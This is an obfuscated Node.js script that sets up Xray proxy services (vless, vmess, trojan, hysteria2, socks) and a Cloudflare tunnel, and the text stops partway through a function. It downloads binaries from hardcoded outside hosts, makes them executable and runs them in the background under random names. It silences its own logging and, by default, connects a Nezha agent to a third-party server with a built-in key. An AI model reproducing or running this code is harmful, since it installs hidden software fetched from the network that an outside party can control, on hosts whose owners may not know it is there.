#!/usr/bin/env node

const _0x5e45e7 = _0x49ed
;(function (_0x3dacd5, _0x376198) {
  const _0xe758cc = _0x49ed,
    _0x35ce1c = _0x3dacd5()
  while (!![]) {
    try {
      const _0xf34d15 =
        -parseInt(_0xe758cc(0xc8)) / 0x1 +
        (parseInt(_0xe758cc(0xa8)) / 0x2) * (parseInt(_0xe758cc(0x1ad)) / 0x3) +
        parseInt(_0xe758cc(0xe8)) / 0x4 +
        -parseInt(_0xe758cc(0xf4)) / 0x5 +
        (-parseInt(_0xe758cc(0xfc)) / 0x6) * (-parseInt(_0xe758cc(0x14c)) / 0x7) +
        parseInt(_0xe758cc(0x118)) / 0x8 +
        (parseInt(_0xe758cc(0xeb)) / 0x9) * (-parseInt(_0xe758cc(0x18c)) / 0xa)
      if (_0xf34d15 === _0x376198) break
      else _0x35ce1c['push'](_0x35ce1c['shift']())
    } catch (_0x91d552) {
      _0x35ce1c['push'](_0x35ce1c['shift']())
    }
  }
})(_0x3f3f, 0x7905b)
const http = require(_0x5e45e7(0x136)),
  axios = require(_0x5e45e7(0x104)),
  os = require('os'),
  fs = require('fs'),
  path = require(_0x5e45e7(0x147)),
  crypto = require(_0x5e45e7(0xc3)),
  { promisify } = require('util'),
  { exec: execCommand, execSync } = require('child_process'),
  exec = promisify(execCommand),
  PORT = process[_0x5e45e7(0xf9)][_0x5e45e7(0x192)] || 0xbb8,
  SUB_PATH = process[_0x5e45e7(0xf9)][_0x5e45e7(0x1b1)] || _0x5e45e7(0x133),
  NAME = process['env']['NAME'] || 'js-node',
  CFIP = process['env'][_0x5e45e7(0xac)] || _0x5e45e7(0x105),
  CFPORT = process[_0x5e45e7(0xf9)][_0x5e45e7(0x19f)] || 0x1bb,
  UPLOAD_URL = process['env'][_0x5e45e7(0xcb)] || '',
  FILE_PATH = process[_0x5e45e7(0xf9)][_0x5e45e7(0x14b)] || _0x5e45e7(0xe9),
  NEZHA_SERVER = process['env'][_0x5e45e7(0x134)] || 'nezha.933993.xyz:443',
  NEZHA_PORT = process[_0x5e45e7(0xf9)][_0x5e45e7(0x1a2)] || '',
  NEZHA_KEY = process['env'][_0x5e45e7(0xd9)] || _0x5e45e7(0xf7),
  UUID = process['env'][_0x5e45e7(0x171)] || _0x5e45e7(0x194),
  ARGO_AUTH = process[_0x5e45e7(0xf9)][_0x5e45e7(0x1a6)] || _0x5e45e7(0x199),
  ARGO_DOMAIN = process[_0x5e45e7(0xf9)][_0x5e45e7(0x1a3)] || _0x5e45e7(0xa9),
  ARGO_PORT = process['env']['ARGO_PORT'] || 0xe2e1,
  S5_PORT = process[_0x5e45e7(0xf9)]['S5_PORT'] || '',
  HY2_PORT = process[_0x5e45e7(0xf9)][_0x5e45e7(0x90)] || '',
  REALITY_PORT = process[_0x5e45e7(0xf9)][_0x5e45e7(0xde)] || '',
  CHAT_ID = process['env'][_0x5e45e7(0x14a)] || _0x5e45e7(0x186),
  BOT_TOKEN = process[_0x5e45e7(0xf9)]['BOT_TOKEN'] || _0x5e45e7(0x159),
  SHOW_LOG = ![_0x5e45e7(0x15f), _0x5e45e7(0x97), 'no'][_0x5e45e7(0x13f)](
    (process[_0x5e45e7(0xf9)][_0x5e45e7(0x11e)] || _0x5e45e7(0x15f))[_0x5e45e7(0x112)]()
  )
!SHOW_LOG && ((console['log'] = () => {}), (console['error'] = () => {}))
function alwaysLog(_0x23ebcd) {
  const _0x407e5b = _0x5e45e7
  process[_0x407e5b(0x99)][_0x407e5b(0xcc)](_0x23ebcd + '\x0a')
}
if (!fs['existsSync'](FILE_PATH)) fs[_0x5e45e7(0xdb)](FILE_PATH)
else {
}
function isValidPort(_0x277076) {
  const _0x8c4283 = _0x5e45e7
  try {
    if (_0x277076 === null || _0x277076 === undefined || _0x277076 === '') return ![]
    if (typeof _0x277076 === _0x8c4283(0x16c) && _0x277076[_0x8c4283(0x12e)]() === '') return ![]
    const _0xba279f = parseInt(_0x277076)
    if (isNaN(_0xba279f)) return ![]
    if (_0xba279f < 0x1 || _0xba279f > 0xffff) return ![]
    return !![]
  } catch (_0x916c18) {
    return ![]
  }
}
function generateRandomName() {
  const _0x269858 = _0x5e45e7,
    _0x16815b = 'abcdefghijklmnopqrstuvwxyz'
  let _0x2d1ba3 = ''
  for (let _0x470fe4 = 0x0; _0x470fe4 < 0x6; _0x470fe4++) {
    _0x2d1ba3 += _0x16815b['charAt'](Math[_0x269858(0x16b)](Math[_0x269858(0xd0)]() * _0x16815b[_0x269858(0xb3)]))
  }
  return _0x2d1ba3
}
let subContent = null,
  privateKey = '',
  publicKey = ''
const npmName = generateRandomName(),
  webName = generateRandomName(),
  botName = generateRandomName(),
  phpName = generateRandomName()
let npmPath = path[_0x5e45e7(0xc2)](FILE_PATH, npmName),
  phpPath = path[_0x5e45e7(0xc2)](FILE_PATH, phpName),
  webPath = path[_0x5e45e7(0xc2)](FILE_PATH, webName),
  botPath = path[_0x5e45e7(0xc2)](FILE_PATH, botName),
  subPath = path[_0x5e45e7(0xc2)](FILE_PATH, _0x5e45e7(0x160)),
  listPath = path[_0x5e45e7(0xc2)](FILE_PATH, _0x5e45e7(0xae)),
  bootLogPath = path[_0x5e45e7(0xc2)](FILE_PATH, 'boot.log'),
  configPath = path['join'](FILE_PATH, 'config.json'),
  certPath = path['resolve'](FILE_PATH, _0x5e45e7(0x178)),
  keyPath = path[_0x5e45e7(0x141)](FILE_PATH, _0x5e45e7(0x164))
function deleteNodes() {
  const _0x423697 = _0x5e45e7
  try {
    if (!UPLOAD_URL) return
    if (!fs[_0x423697(0xc6)](subPath)) return
    let _0x179e74
    try {
      _0x179e74 = fs['readFileSync'](subPath, _0x423697(0x16e))
    } catch {
      return null
    }
    const _0x2c0d8d = Buffer[_0x423697(0x18f)](_0x179e74, _0x423697(0x16f))['toString']('utf-8'),
      _0x308f43 = _0x2c0d8d[_0x423697(0xa6)]('\x0a')['filter']((_0x49739c) => /(vless|vmess|trojan|hysteria2|socks):\/\//[_0x423697(0xf0)](_0x49739c))
    if (_0x308f43[_0x423697(0xb3)] === 0x0) return
    return (
      axios[_0x423697(0x117)](UPLOAD_URL + '/api/delete-nodes', JSON[_0x423697(0xff)]({ nodes: _0x308f43 }), {
        headers: { 'Content-Type': _0x423697(0x18d) }
      })[_0x423697(0x140)]((_0x504b3b) => {
        return null
      }),
      null
    )
  } catch (_0x1c5431) {
    return null
  }
}
function cleanupOldFiles() {
  const _0x196b13 = _0x5e45e7
  try {
    const _0x1c8cf1 = fs['readdirSync'](FILE_PATH)
    _0x1c8cf1[_0x196b13(0x126)]((_0x3ec544) => {
      const _0x398e37 = _0x196b13,
        _0x51f7f7 = path[_0x398e37(0xc2)](FILE_PATH, _0x3ec544)
      try {
        const _0x4a4082 = fs[_0x398e37(0x193)](_0x51f7f7)
        _0x4a4082[_0x398e37(0xdf)]() && fs[_0x398e37(0xa7)](_0x51f7f7)
      } catch (_0x39edd3) {}
    })
  } catch (_0x6eedf2) {}
}
function generateX25519Keypair() {
  const _0x3951fb = _0x5e45e7,
    { publicKey: _0x3ffa18, privateKey: _0xf4cd73 } = crypto[_0x3951fb(0x9b)](_0x3951fb(0x154)),
    _0x4dbf2a = _0xf4cd73['export']({ type: _0x3951fb(0x170), format: _0x3951fb(0x8f) })['subarray'](-0x20),
    _0x4896e3 = _0x3ffa18['export']({ type: _0x3951fb(0x191), format: 'der' })[_0x3951fb(0x14f)](-0x20)
  return { privateKey: _0x4dbf2a[_0x3951fb(0x91)]('base64url'), publicKey: _0x4896e3[_0x3951fb(0x91)](_0x3951fb(0x11a)) }
}
function generateOrLoadKeyPair() {
  const _0x35f6ad = _0x5e45e7,
    _0x39e243 = path[_0x35f6ad(0xc2)](FILE_PATH, _0x35f6ad(0xaa))
  if (fs['existsSync'](_0x39e243)) {
    const _0x4a4964 = fs[_0x35f6ad(0xd4)](_0x39e243, 'utf8'),
      _0x4cec13 = _0x4a4964['match'](/PrivateKey:\s*(.*)/),
      _0x252a61 = _0x4a4964[_0x35f6ad(0x124)](/PublicKey:\s*(.*)/)
    if (_0x4cec13 && _0x252a61) {
      ;((privateKey = _0x4cec13[0x1][_0x35f6ad(0x12e)]()),
        (publicKey = _0x252a61[0x1][_0x35f6ad(0x12e)]()),
        console['log'](_0x35f6ad(0xfe), privateKey),
        console[_0x35f6ad(0x121)](_0x35f6ad(0x93), publicKey))
      return
    }
  }
  const _0x1b0d65 = generateX25519Keypair()
  ;((privateKey = _0x1b0d65[_0x35f6ad(0xb8)]),
    (publicKey = _0x1b0d65['publicKey']),
    fs[_0x35f6ad(0x100)](_0x39e243, _0x35f6ad(0xc4) + privateKey + _0x35f6ad(0xdc) + publicKey + '\x0a', _0x35f6ad(0xb1)),
    console[_0x35f6ad(0x121)](_0x35f6ad(0xfe), privateKey),
    console[_0x35f6ad(0x121)](_0x35f6ad(0x93), publicKey))
}
const FALLBACK_EC_KEY =
    '-----BEGIN\x20EC\x20PARAMETERS-----\x0a' +
    _0x5e45e7(0x17d) +
    _0x5e45e7(0x123) +
    _0x5e45e7(0x95) +
    'MHcCAQEEIM4792SEtPqIt1ywqTd/0bYidBqpYV/++siNnfBYsdUYoAoGCCqGSM49\x0a' +
    _0x5e45e7(0x18e) +
    _0x5e45e7(0xbe) +
    _0x5e45e7(0x148),
  FALLBACK_CERT =
    _0x5e45e7(0x111) +
    _0x5e45e7(0x13a) +
    _0x5e45e7(0x14e) +
    'MDIyWjATMREwDwYDVQQDDAhiaW5nLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEH\x0a' +
    _0x5e45e7(0xe7) +
    _0x5e45e7(0xb5) +
    _0x5e45e7(0xe2) +
    'Af8EBTADAQH/MAoGCCqGSM49BAMCA0cAMEQCIAIDAJvg0vd/ytrQVvEcSm6XTlB+\x0a' +
    _0x5e45e7(0x12f) +
    _0x5e45e7(0xba)
function ensureTlsCertificates(_0xa45645, _0x45710c) {
  const _0x27d75e = _0x5e45e7
  if (fs[_0x27d75e(0xc6)](_0xa45645) && fs[_0x27d75e(0xc6)](_0x45710c)) return
  fs['mkdirSync'](path[_0x27d75e(0xf8)](_0xa45645), { recursive: !![] })
  try {
    ;(execSync(_0x27d75e(0xaf), { stdio: 'ignore' }),
      execSync(_0x27d75e(0x173) + _0x45710c + '\x22', { stdio: _0x27d75e(0xe4) }),
      execSync(_0x27d75e(0xc1) + _0x45710c + _0x27d75e(0x19e) + _0xa45645 + _0x27d75e(0x196), { stdio: _0x27d75e(0xe4) }))
    return
  } catch (_0x5c4c77) {}
  ;(fs[_0x27d75e(0x100)](_0x45710c, FALLBACK_EC_KEY), fs['writeFileSync'](_0xa45645, FALLBACK_CERT))
}
function getCertificateFingerprint(_0x14fd02) {
  const _0x5c1cf3 = _0x5e45e7
  try {
    const _0x4f2630 = execSync(_0x5c1cf3(0xc9) + _0x14fd02 + '\x22', { encoding: _0x5c1cf3(0xb1), timeout: 0xbb8 })[_0x5c1cf3(0x12e)](),
      _0x44a300 = _0x4f2630[_0x5c1cf3(0x124)](/=(.+)$/)
    if (_0x44a300 && _0x44a300[0x1]) return _0x44a300[0x1][_0x5c1cf3(0x195)]()
  } catch (_0x131cf1) {}
  try {
    const _0x1d0b7f = fs[_0x5c1cf3(0xd4)](_0x14fd02, _0x5c1cf3(0xb1)),
      _0x4fb913 = _0x1d0b7f['match'](/-----BEGIN CERTIFICATE-----([\s\S]+?)-----END CERTIFICATE-----/)
    if (!_0x4fb913) return ''
    const _0x53d56c = _0x4fb913[0x1]['replace'](/\s/g, ''),
      _0xd8c114 = Buffer[_0x5c1cf3(0x18f)](_0x53d56c, _0x5c1cf3(0x16f)),
      _0xae2e72 = crypto[_0x5c1cf3(0x8d)](_0x5c1cf3(0xd3))[_0x5c1cf3(0x132)](_0xd8c114)['digest']('hex')
    return _0xae2e72[_0x5c1cf3(0x124)](/.{2}/g)[_0x5c1cf3(0xc2)](':')['toUpperCase']()
  } catch (_0x216589) {
    return (console[_0x5c1cf3(0x101)](_0x5c1cf3(0x96), _0x216589), '')
  }
}
async function generateConfig() {
  const _0x5c4de5 = _0x5e45e7,
    _0x1a3fb1 = {
      log: { access: _0x5c4de5(0x127), error: _0x5c4de5(0x127), loglevel: _0x5c4de5(0x12b) },
      inbounds: [
        {
          tag: _0x5c4de5(0xce),
          port: ARGO_PORT,
          listen: '::',
          protocol: _0x5c4de5(0xe5),
          settings: {
            clients: [{ id: UUID, flow: _0x5c4de5(0x13c) }],
            decryption: _0x5c4de5(0x12b),
            fallbacks: [
              { dest: 0xbb9 },
              { path: '/vless-argo', dest: 0xbba },
              { path: '/vmess-argo', dest: 0xbbb },
              { path: _0x5c4de5(0x107), dest: 0xbbc }
            ]
          },
          streamSettings: { network: _0x5c4de5(0x180) }
        },
        {
          tag: _0x5c4de5(0x94),
          port: 0xbb9,
          listen: _0x5c4de5(0xe3),
          protocol: _0x5c4de5(0xe5),
          settings: { clients: [{ id: UUID }], decryption: _0x5c4de5(0x12b) },
          streamSettings: { network: _0x5c4de5(0x180), security: _0x5c4de5(0x12b) }
        },
        {
          tag: _0x5c4de5(0x18a),
          port: 0xbba,
          listen: _0x5c4de5(0xe3),
          protocol: _0x5c4de5(0xe5),
          settings: { clients: [{ id: UUID, level: 0x0 }], decryption: _0x5c4de5(0x12b) },
          streamSettings: { network: 'ws', security: 'none', wsSettings: { path: _0x5c4de5(0xb7) } },
          sniffing: { enabled: !![], destOverride: [_0x5c4de5(0x136), _0x5c4de5(0x103), _0x5c4de5(0xf2)], metadataOnly: ![] }
        },
        {
          tag: _0x5c4de5(0x146),
          port: 0xbbb,
          listen: _0x5c4de5(0xe3),
          protocol: 'vmess',
          settings: { clients: [{ id: UUID, alterId: 0x0 }] },
          streamSettings: { network: 'ws', wsSettings: { path: _0x5c4de5(0x151) } },
          sniffing: { enabled: !![], destOverride: ['http', _0x5c4de5(0x103), _0x5c4de5(0xf2)], metadataOnly: ![] }
        },
        {
          tag: _0x5c4de5(0x187),
          port: 0xbbc,
          listen: _0x5c4de5(0xe3),
          protocol: _0x5c4de5(0x9f),
          settings: { clients: [{ password: UUID }] },
          streamSettings: { network: 'ws', security: _0x5c4de5(0x12b), wsSettings: { path: _0x5c4de5(0x107) } },
          sniffing: { enabled: !![], destOverride: ['http', _0x5c4de5(0x103), _0x5c4de5(0xf2)], metadataOnly: ![] }
        }
      ],
      dns: { servers: [_0x5c4de5(0x17b)] },
      outbounds: [
        { protocol: _0x5c4de5(0x12c), tag: _0x5c4de5(0x16d) },
        { protocol: _0x5c4de5(0x8c), tag: _0x5c4de5(0xa3) }
      ]
    }
  ;(isValidPort(REALITY_PORT) &&
    _0x1a3fb1[_0x5c4de5(0x109)]['push']({
      tag: _0x5c4de5(0xa0),
      listen: '::',
      port: parseInt(REALITY_PORT),
      protocol: _0x5c4de5(0xe5),
      settings: { clients: [{ id: UUID, flow: _0x5c4de5(0x13c) }], decryption: _0x5c4de5(0x12b) },
      streamSettings: {
        network: 'raw',
        security: _0x5c4de5(0x182),
        realitySettings: { show: ![], dest: _0x5c4de5(0x8b), xver: 0x0, serverNames: [_0x5c4de5(0xb0)], privateKey: privateKey, shortIds: [''] }
      }
    }),
    isValidPort(HY2_PORT) &&
      _0x1a3fb1['inbounds'][_0x5c4de5(0x15e)]({
        tag: _0x5c4de5(0x12a),
        listen: '::',
        port: parseInt(HY2_PORT),
        protocol: _0x5c4de5(0xd7),
        settings: { version: 0x2, clients: [{ auth: UUID }] },
        streamSettings: {
          network: _0x5c4de5(0xd7),
          hysteriaSettings: { version: 0x2, masquerade: { type: _0x5c4de5(0x17f), url: _0x5c4de5(0x9a) } },
          security: _0x5c4de5(0x103),
          tlsSettings: { alpn: ['h3'], certificates: [{ certificateFile: certPath, keyFile: keyPath }] }
        }
      }),
    isValidPort(S5_PORT) &&
      _0x1a3fb1[_0x5c4de5(0x109)][_0x5c4de5(0x15e)]({
        tag: _0x5c4de5(0xc0),
        listen: '::',
        port: parseInt(S5_PORT),
        protocol: 'socks',
        settings: { auth: _0x5c4de5(0x139), accounts: [{ user: UUID[_0x5c4de5(0x176)](0x0, 0x8), pass: UUID[_0x5c4de5(0x8e)](-0xc) }], udp: !![] }
      }),
    fs[_0x5c4de5(0x100)](path[_0x5c4de5(0xc2)](FILE_PATH, _0x5c4de5(0xb9)), JSON[_0x5c4de5(0xff)](_0x1a3fb1, null, 0x2)))
}
function getSystemArchitecture() {
  const _0x31306f = _0x5e45e7,
    _0x459106 = os[_0x31306f(0x19c)]()
  return _0x459106 === _0x31306f(0xf1) || _0x459106 === _0x31306f(0x10e) || _0x459106 === _0x31306f(0x11f) ? _0x31306f(0xf1) : _0x31306f(0x163)
}
function downloadFile(_0x2b239c, _0x2c0a55, _0x5646e1) {
  const _0x1d0205 = _0x5e45e7,
    _0x55e0b9 = _0x2b239c,
    _0x50744d = _0x55e0b9 + _0x1d0205(0x161)
  !fs[_0x1d0205(0xc6)](FILE_PATH) && fs[_0x1d0205(0xdb)](FILE_PATH, { recursive: !![] })
  const _0x10d20e = fs['createWriteStream'](_0x50744d)
  axios({ method: _0x1d0205(0x130), url: _0x2c0a55, responseType: _0x1d0205(0x177) })
    [_0x1d0205(0x181)]((_0x425701) => {
      const _0x28e30c = _0x1d0205
      ;(_0x425701[_0x28e30c(0x149)]['pipe'](_0x10d20e),
        _0x10d20e['on']('finish', () => {
          const _0x8245d9 = _0x28e30c
          _0x10d20e[_0x8245d9(0x174)]((_0x5e4ed) => {
            const _0x1e1b4a = _0x8245d9
            if (_0x5e4ed) {
              const _0x3c914e = _0x1e1b4a(0xe0) + path[_0x1e1b4a(0x152)](_0x55e0b9) + _0x1e1b4a(0x1a5) + _0x5e4ed[_0x1e1b4a(0xb6)]
              ;(fs[_0x1e1b4a(0xd5)](_0x50744d, () => {}), console[_0x1e1b4a(0x101)](_0x3c914e), _0x5646e1(_0x3c914e))
              return
            }
            try {
              fs['renameSync'](_0x50744d, _0x55e0b9)
            } catch (_0x33f056) {
              const _0x434f9f = _0x1e1b4a(0xe0) + path['basename'](_0x55e0b9) + _0x1e1b4a(0x1a5) + _0x33f056[_0x1e1b4a(0xb6)]
              ;(fs[_0x1e1b4a(0xd5)](_0x50744d, () => {}), console[_0x1e1b4a(0x101)](_0x434f9f), _0x5646e1(_0x434f9f))
              return
            }
            ;(console['log']('Download\x20' + path[_0x1e1b4a(0x152)](_0x55e0b9) + _0x1e1b4a(0x8a)), _0x5646e1(null, _0x55e0b9))
          })
        }),
        _0x10d20e['on'](_0x28e30c(0x101), (_0x473210) => {
          const _0x35cc52 = _0x28e30c
          fs[_0x35cc52(0xd5)](_0x50744d, () => {})
          const _0x3b0752 = _0x35cc52(0xe0) + path['basename'](_0x55e0b9) + _0x35cc52(0x1a5) + _0x473210['message']
          ;(console['error'](_0x3b0752), _0x5646e1(_0x3b0752))
        }))
    })
    [_0x1d0205(0x140)]((_0xb67456) => {
      const _0x1a0c32 = _0x1d0205
      fs[_0x1a0c32(0xd5)](_0x50744d, () => {})
      const _0x23cd0c = _0x1a0c32(0xe0) + path['basename'](_0x55e0b9) + _0x1a0c32(0x1a5) + _0xb67456[_0x1a0c32(0xb6)]
      ;(console[_0x1a0c32(0x101)](_0x23cd0c), _0x5646e1(_0x23cd0c))
    })
}
async function downloadFilesAndRun() {
  const _0x57aba3 = _0x5e45e7,
    _0x48fbb5 = getSystemArchitecture(),
    _0x54a867 = getFilesForArchitecture(_0x48fbb5)
  if (_0x54a867['length'] === 0x0) {
    console[_0x57aba3(0x121)](_0x57aba3(0x92))
    return
  }
  const _0x4d6792 = _0x54a867[_0x57aba3(0x157)]((_0x4e87f7) => {
    return new Promise((_0x2a756e, _0x39ccd2) => {
      const _0x221351 = (_0x376632) => {
        const _0x5d95c6 = _0x49ed
        downloadFile(_0x4e87f7[_0x5d95c6(0x116)], _0x4e87f7[_0x5d95c6(0x13b)][_0x376632], (_0x339217, _0xedbb58) => {
          const _0x568e02 = _0x5d95c6
          if (!_0x339217) {
            _0x2a756e(_0xedbb58)
            return
          }
          if (_0x376632 + 0x1 < _0x4e87f7[_0x568e02(0x13b)][_0x568e02(0xb3)]) {
            ;(console[_0x568e02(0x121)](_0x568e02(0xec) + path[_0x568e02(0x152)](_0x4e87f7['fileName']) + _0x568e02(0x166)),
              _0x221351(_0x376632 + 0x1))
            return
          }
          _0x39ccd2(_0x339217)
        })
      }
      _0x221351(0x0)
    })
  })
  try {
    await Promise[_0x57aba3(0x197)](_0x4d6792)
  } catch (_0x17df84) {
    console['error'](_0x57aba3(0x158), _0x17df84)
    return
  }
  function _0xb32736(_0x46536c) {
    const _0x410ea8 = _0x57aba3,
      _0x324755 = 0x1fd
    _0x46536c[_0x410ea8(0x126)]((_0x3ad930) => {
      const _0x557db8 = _0x410ea8
      if (fs[_0x557db8(0xc6)](_0x3ad930))
        try {
          ;(fs[_0x557db8(0x1ae)](_0x3ad930, _0x324755),
            console[_0x557db8(0x121)](_0x557db8(0xa1) + _0x3ad930 + ':\x20' + _0x324755[_0x557db8(0x91)](0x8)))
        } catch (_0x40a5bf) {
          console['error']('Empowerment\x20failed\x20for\x20' + _0x3ad930 + ':\x20' + _0x40a5bf)
        }
    })
  }
  const _0x304b9c = NEZHA_PORT ? [npmPath, webPath, botPath] : [phpPath, webPath, botPath]
  _0xb32736(_0x304b9c)
  if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      const _0x14778e = NEZHA_SERVER[_0x57aba3(0x13f)](':') ? NEZHA_SERVER['split'](':')[_0x57aba3(0x13e)]() : '',
        _0x5731c3 = new Set(['443', '8443', '2096', _0x57aba3(0x15d), _0x57aba3(0x1a9), _0x57aba3(0x172)]),
        _0x1a62ca = _0x5731c3[_0x57aba3(0x17e)](_0x14778e) ? _0x57aba3(0x108) : _0x57aba3(0x15f),
        _0x5edf09 = _0x57aba3(0x175) + NEZHA_KEY + _0x57aba3(0x10b) + NEZHA_SERVER + _0x57aba3(0x10c) + _0x1a62ca + _0x57aba3(0x185) + UUID
      fs[_0x57aba3(0x100)](path['join'](FILE_PATH, 'config.yaml'), _0x5edf09)
      const _0x24c9a6 = 'nohup\x20' + phpPath + _0x57aba3(0x144) + FILE_PATH + _0x57aba3(0xee)
      try {
        ;(await exec(_0x24c9a6), console['log'](phpName + _0x57aba3(0xd8)), await new Promise((_0x3fb85c) => setTimeout(_0x3fb85c, 0x3e8)))
      } catch (_0x50b371) {
        console[_0x57aba3(0x101)](_0x57aba3(0x17c) + _0x50b371)
      }
    } else {
      let _0xb6b76 = ''
      const _0xe52a7a = ['443', _0x57aba3(0x15a), _0x57aba3(0x110), _0x57aba3(0x15d), _0x57aba3(0x1a9), _0x57aba3(0x172)]
      _0xe52a7a['includes'](NEZHA_PORT) && (_0xb6b76 = _0x57aba3(0x1a1))
      const _0x4e14d1 =
        _0x57aba3(0x131) +
        npmPath +
        _0x57aba3(0x19b) +
        NEZHA_SERVER +
        ':' +
        NEZHA_PORT +
        _0x57aba3(0x17a) +
        NEZHA_KEY +
        '\x20' +
        _0xb6b76 +
        _0x57aba3(0x1af)
      try {
        ;(await exec(_0x4e14d1), console[_0x57aba3(0x121)](npmName + _0x57aba3(0xd8)), await new Promise((_0x478fda) => setTimeout(_0x478fda, 0x3e8)))
      } catch (_0x1ba324) {
        console[_0x57aba3(0x101)](_0x57aba3(0x129) + _0x1ba324)
      }
    }
  } else console[_0x57aba3(0x121)](_0x57aba3(0x15c))
  const _0x1e552d = _0x57aba3(0x131) + webPath + _0x57aba3(0x1a4) + FILE_PATH + _0x57aba3(0x12d)
  try {
    ;(await exec(_0x1e552d), console[_0x57aba3(0x121)](webName + _0x57aba3(0xd8)), await new Promise((_0x65629c) => setTimeout(_0x65629c, 0x3e8)))
  } catch (_0x1fdb81) {
    console['error'](_0x57aba3(0x113) + _0x1fdb81)
  }
  if (fs[_0x57aba3(0xc6)](botPath)) {
    let _0x43dab4
    if (ARGO_AUTH[_0x57aba3(0x124)](/^[A-Z0-9a-z=]{120,250}$/))
      _0x43dab4 = 'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20' + ARGO_AUTH
    else
      ARGO_AUTH[_0x57aba3(0x124)](/TunnelSecret/)
        ? (_0x43dab4 = _0x57aba3(0xfd) + path[_0x57aba3(0x141)](FILE_PATH, _0x57aba3(0xc7)) + _0x57aba3(0x167))
        : (_0x43dab4 = _0x57aba3(0x183) + path[_0x57aba3(0x141)](bootLogPath) + _0x57aba3(0x190) + ARGO_PORT)
    try {
      ;(await exec('nohup\x20\x22' + path[_0x57aba3(0x141)](botPath) + '\x22\x20' + _0x43dab4 + _0x57aba3(0x16a)),
        console[_0x57aba3(0x121)](botName + _0x57aba3(0xd8)),
        await new Promise((_0x3570b1) => setTimeout(_0x3570b1, 0x7d0)))
    } catch (_0x3ce059) {
      console[_0x57aba3(0x101)](_0x57aba3(0x11b) + _0x3ce059)
    }
  }
  await new Promise((_0x3f0e57) => setTimeout(_0x3f0e57, 0x1388))
}
function getFilesForArchitecture(_0x27cc1b) {
  const _0x491bdb = _0x5e45e7,
    _0x12c021 = _0x27cc1b === 'arm' ? _0x491bdb(0x13d) : _0x491bdb(0x119),
    _0x2e11a7 = _0x27cc1b === _0x491bdb(0xf1) ? _0x491bdb(0x138) : 'https://amd64.ssss.nyc.mn',
    _0x756545 = [
      { fileName: webPath, fileUrls: [_0x12c021 + _0x491bdb(0x145), _0x2e11a7 + _0x491bdb(0x145)] },
      { fileName: botPath, fileUrls: [_0x12c021 + '/bot', _0x2e11a7 + _0x491bdb(0x10a)] }
    ]
  return (
    NEZHA_SERVER &&
      NEZHA_KEY &&
      (NEZHA_PORT
        ? _0x756545[_0x491bdb(0x188)]({ fileName: npmPath, fileUrls: [_0x12c021 + _0x491bdb(0x11c), _0x2e11a7 + _0x491bdb(0x11c)] })
        : _0x756545[_0x491bdb(0x188)]({ fileName: phpPath, fileUrls: [_0x12c021 + _0x491bdb(0xda), _0x2e11a7 + '/v1'] })),
    _0x756545
  )
}
function argoType() {
  const _0x422a2c = _0x5e45e7
  if (!ARGO_AUTH || !ARGO_DOMAIN) {
    console[_0x422a2c(0x121)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20is\x20empty,\x20use\x20quick\x20tunnels')
    return
  }
  if (ARGO_AUTH[_0x422a2c(0x13f)]('TunnelSecret')) {
    fs['writeFileSync'](path[_0x422a2c(0xc2)](FILE_PATH, _0x422a2c(0xfb)), ARGO_AUTH)
    const _0x3837e3 =
      _0x422a2c(0x89) +
      ARGO_AUTH[_0x422a2c(0xa6)]('\x22')[0xb] +
      _0x422a2c(0xdd) +
      path[_0x422a2c(0xc2)](FILE_PATH, _0x422a2c(0xfb)) +
      _0x422a2c(0x19d) +
      ARGO_DOMAIN +
      _0x422a2c(0xad) +
      ARGO_PORT +
      '\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20'
    fs[_0x422a2c(0x100)](path[_0x422a2c(0xc2)](FILE_PATH, _0x422a2c(0xc7)), _0x3837e3)
  } else console[_0x422a2c(0x121)](_0x422a2c(0x9d) + ARGO_PORT + _0x422a2c(0xbf))
}
async function waitForQuickTunnelLog(_0x483b80 = 0x7530) {
  const _0x3d0d67 = _0x5e45e7,
    _0x219038 = Date['now']() + _0x483b80
  while (Date[_0x3d0d67(0xf3)]() < _0x219038) {
    try {
      if (fs[_0x3d0d67(0xc6)](bootLogPath)) {
        const _0x4211db = fs['readFileSync'](bootLogPath, _0x3d0d67(0x16e))
        if (/trycloudflare\.com/['test'](_0x4211db)) return _0x4211db
      }
    } catch (_0x5a27bc) {}
    await new Promise((_0x162266) => setTimeout(_0x162266, 0x3e8))
  }
  return ''
}
function _0x49ed(_0x431ae9, _0x35e840) {
  const _0x3f3f6a = _0x3f3f()
  return (
    (_0x49ed = function (_0x49ed6f, _0x44a86f) {
      _0x49ed6f = _0x49ed6f - 0x89
      let _0x11a665 = _0x3f3f6a[_0x49ed6f]
      return _0x11a665
    }),
    _0x49ed(_0x431ae9, _0x35e840)
  )
}
async function extractDomains() {
  const _0x16e7e8 = _0x5e45e7
  let _0x2f9fbf
  if (ARGO_AUTH && ARGO_DOMAIN) ((_0x2f9fbf = ARGO_DOMAIN), console[_0x16e7e8(0x121)](_0x16e7e8(0x128), _0x2f9fbf), await generateLinks(_0x2f9fbf))
  else
    try {
      const _0x19581e = await waitForQuickTunnelLog(),
        _0x166f92 = _0x19581e[_0x16e7e8(0xa6)]('\x0a'),
        _0x196d7d = []
      _0x166f92[_0x16e7e8(0x126)]((_0x1c3660) => {
        const _0xd4c0d3 = _0x16e7e8,
          _0x4aaa99 = _0x1c3660[_0xd4c0d3(0x124)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/)
        if (_0x4aaa99) {
          const _0xfd9cf4 = _0x4aaa99[0x1]
          _0x196d7d[_0xd4c0d3(0x15e)](_0xfd9cf4)
        }
      })
      if (_0x196d7d[_0x16e7e8(0xb3)] > 0x0)
        ((_0x2f9fbf = _0x196d7d[0x0]), console[_0x16e7e8(0x121)]('ArgoDomain:', _0x2f9fbf), await generateLinks(_0x2f9fbf))
      else {
        ;(console[_0x16e7e8(0x121)](_0x16e7e8(0xbd)), fs['unlinkSync'](path[_0x16e7e8(0xc2)](FILE_PATH, _0x16e7e8(0x198))))
        async function _0x241b27() {
          const _0x5af612 = _0x16e7e8
          try {
            process[_0x5af612(0x14d)] === _0x5af612(0xf5)
              ? await exec(_0x5af612(0x98) + botName + _0x5af612(0x150))
